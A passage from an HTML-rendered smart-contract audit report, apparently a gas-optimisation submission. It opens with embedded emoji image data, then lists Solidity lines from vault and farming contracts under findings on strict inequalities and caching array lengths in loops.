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&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">title</span><span class=\"mtk1\">=</span><span class=\"mtk8\">&quot;emoji-100&quot;</span><span class=\"mtk1\"> /&gt;            </span><span class=\"mtk12\">_rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">143</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;INVALID_AMOUNT&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">167</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_shares</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;INVALID_AMOUNT&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">170</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;NO_TOKENS_DEPOSITED&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">94</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">_creditLimitRate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">108</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answer</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_oracle_answer&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">142</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">164</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">180</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">194</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">collateralAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">278</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newFloor</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid floor&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">327</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">_type</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || </span><span class=\"mtk12\">nftTypeValueETH</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_type</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">365</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pendingValue</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;no_pending_value&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">402</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">462</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answer</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_oracle_answer&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">687</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">764</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">770</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;position_not_borrowed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">882</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidatedAt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;not_liquidated&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">926</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidatedAt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;not_liquidated&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Also, please enable the Optimizer.</p>\n<h2 id=\"g-35--is-cheaper-than-\" style=\"position:relative;\"><a href=\"#g-35--is-cheaper-than-\" aria-label=\"g 35  is cheaper than  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-35] <code>>=</code> is cheaper than <code>></code></h2>\n<p>Strict inequalities (<code>></code>) are more expensive than non-strict ones (<code>>=</code>). This is due to some supplementary checks (ISZERO, 3 gas)</p>\n<p>I suggest using  <code>>=</code>  instead of <code>></code> to avoid some opcodes here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">539</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">calculatedDebt</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">calculatedDebt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">775</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-36-an-arrays-length-should-be-cached-to-save-gas-in-for-loops\" style=\"position:relative;\"><a href=\"#g-36-an-arrays-length-should-be-cached-to-save-gas-in-for-loops\" aria-label=\"g 36 an arrays length should be cached to save gas in for loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-36] An array’s length should be cached to save gas in for-loops</h2>\n<p>Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.</p>\n<p>Caching the array length in the stack saves around 3 gas per iteration.</p>\n<p>Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">348</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_strategyConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">319</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">181</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_typeInitializers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">184</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nfts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>This is already done here:</p>\n<pre class=\"grvsc-container 